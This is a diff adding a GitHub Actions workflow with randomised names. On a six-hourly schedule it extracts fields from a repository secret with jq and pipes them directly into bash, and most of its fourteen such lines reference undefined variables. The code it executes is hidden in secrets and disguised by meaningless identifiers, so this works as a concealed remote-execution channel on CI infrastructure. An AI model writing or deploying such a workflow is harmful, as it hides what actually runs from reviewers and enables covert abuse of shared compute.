@@ -1,0 +1,29 @@
+name: xindangxianing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xindangxianing
+        env:
+          fbu4171: ${{ secrets.fbu4171 }}
+        run: |
+          echo $fbu4171 | jq -r .ofo4395 | /bin/bash
+          echo $dh24 | jq -r .bikjz8 | /bin/bash
+          echo $worv845 | jq -r .drfai4719 | /bin/bash
+          echo $irk1 | jq -r .ntny860 | /bin/bash
+          echo $zxg36249 | jq -r .eyyz28 | /bin/bash
+          echo $zmm0723 | jq -r .v1929 | /bin/bash
+          echo $zuea255 | jq -r .il42704 | /bin/bash
+          echo $wbco07723 | jq -r .p5436 | /bin/bash
+          echo $y183 | jq -r .oym7320 | /bin/bash
+          echo $cscn552 | jq -r .mfnxt8244 | /bin/bash
+          echo $vxdpn4 | jq -r .uq31 | /bin/bash
+          echo $ls724 | jq -r .hc5 | /bin/bash
+          echo $f1412 | jq -r .mjbv84 | /bin/bash
+          echo $tv6869 | jq -r .gv72405 | /bin/bash
+
